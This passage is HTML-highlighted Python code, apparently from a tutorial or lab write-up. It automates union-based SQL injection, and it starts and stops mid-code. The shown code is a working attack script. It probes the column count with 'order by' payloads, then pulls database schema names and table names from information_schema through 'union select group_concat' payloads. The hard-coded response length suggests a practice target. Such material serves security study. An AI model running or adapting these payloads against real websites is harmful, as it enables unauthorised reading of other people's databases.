js-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">20</span>):<br>        playload = <span class="hljs-string">&quot;order by %d --+&quot;</span> %(i);<br>        html = getHTMLText(url, playload);<br>        <span class="hljs-comment">#print(len(html));</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(html) != <span class="hljs-number">670</span>:<br>            <span class="hljs-keyword">return</span> (i-<span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">continue</span>;<br><br><span class="hljs-comment">#select schema_name from information_schema.schemata</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getMYSQLName</span>(<span class="hljs-params">url</span>):</span><br>    playload = <span class="hljs-string">&quot;union select 1,(select group_concat(schema_name) from information_schema.schemata),3 --+&quot;</span><br>    html = getHTMLText(url,playload);<br>    tmp = html.split(<span class="hljs-string">&#x27;:&#x27;</span>)[-<span class="hljs-number">2</span>];<br>    db_name = tmp.split(<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>)[<span class="hljs-number">0</span>];<br>    <span class="hljs-keyword">return</span> db_name;<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getTABLEName</span>(<span class="hljs-params">url, db_name</span>):</span><br>    playload = <span class="hljs-string">&quot;union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;%s&#x27;),3 --+&quot;</span>%(db_name);<br>    html = getHTMLText(url,playload);<br>    tmp = html.split(<span class="hljs-string">&#x27;:&#x27;</span>)[-<span class="hljs-number">2</span>];<br>    tb_name = tmp.split(<span class="hljs-string">&#x27;&lt;br&gt
